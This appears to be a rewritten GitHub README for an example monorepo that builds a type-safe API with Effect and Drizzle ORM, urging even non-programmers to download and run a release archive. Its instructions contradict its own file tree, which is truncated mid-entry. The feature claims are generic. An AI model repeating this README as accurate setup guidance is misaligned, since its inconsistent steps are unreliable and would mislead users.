---
layout: "default"
title: "🌟 effect-api-example - Build Your Own Type-Safe API"
description: "🚀 Build a type-safe API using Effect, @effect/platform, and Drizzle ORM in this straightforward monorepo example."
---
# 🌟 effect-api-example - Build Your Own Type-Safe API

## 📥 Download the Latest Release
[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Gnomo6/effect-api-example/releases)

## 📚 Overview
Welcome to the Effect API Example repository! This project shows how to create a type-safe API using Effect, the Effect platform, and Drizzle ORM. This guide will help you download and run the software easily, even if you have no programming experience.

## 🚀 Getting Started
Follow these steps to get up and running quickly.

### 1. 💻 System Requirements
To use this software, you need:
- A computer running Windows, macOS, or Linux.
- An internet connection to download the files.

### 2. 📦 Download & Install
Visit this page to download: [Download the latest release](https://github.com/Gnomo6/effect-api-example/releases).

### 3. 📂 Extract the Files
1. After downloading, find the downloaded file in your computer's downloads folder.
2. Right-click on the file and select "Extract" or "Unzip."
3. Choose a folder where you want to save the extracted files.

### 4. ⚙️ Run the Server
1. Navigate to the folder where you extracted the files.
2. Look for a file named `docker-compose.yml`.
3. Open a terminal or command prompt in that folder.
4. Run the command below to start the server:

   ```bash
   docker-compose up
   ```

5. After a few moments, you should see messages indicating that the server is running.

### 5. 🖥️ Access the API
Open your web browser and type in the following address:

```
http://localhost:3000
```

You are now accessing the API!

## 🛠️ Repository Structure
Here’s a brief overview of the folder structure in this project:

```
effect-api-example/
├── apps/
│   └── server/                 # Bun HTTP server
│       ├── src/
│       │   ├── api/
│       │   │   ├── groups/     # API endpoint handlers
│       │   │   └── middleware/ # Auth middleware implementations
│       │   ├── db/
│       │   │   ├── schema/     # Drizzle table schemas
│       │   │   ├── migrations/ # Database migrations
│       │   │   └── SqlLive.ts  # Database layer
│       │   └── main.ts         # Server entrypoint
│       ├── scripts/
│       │   ├── seed.ts         # Database seeding script
│       │   └── client-example.ts # Example API client
│       ├── docker-compose.yml  # PostgreSQL container
│       └── drizzle.config.ts   # Drizzle Kit configuration
├── packages/
│   ├── a
```

## 🔍 Features
- **Type-Safe API:** Ensure safety in your API with type definitions.
- **Integrated Database:** Connect smoothly with a built-in database handling system.
- **User-Friendly:** Easy to understand and use, designed for everyone.
- **Expandable:** Add new features as needed.

## 🔧 Configuration
To tailor the server settings:
1. Open the `drizzle.config.ts` file.
2. Adjust settings like database connections and other variables.

## 📜 License
This project is open-source and follows the MIT License. You can modify and use it as you wish.

## 👥 Contributing
If you want to help improve this project:
1. Fork the repository.
2. Make your changes.
3. Submit a pull request with a clear description of your changes.

## 📞 Support and Feedback
If you encounter difficulties or have questions:
- Open an issue on the [GitHub repository](https://github.com/Gnomo6/effect-api-example/issues).
- Join the community for more support.

Thank you for exploring the effect-api-example! Enjoy building your type-safe API.
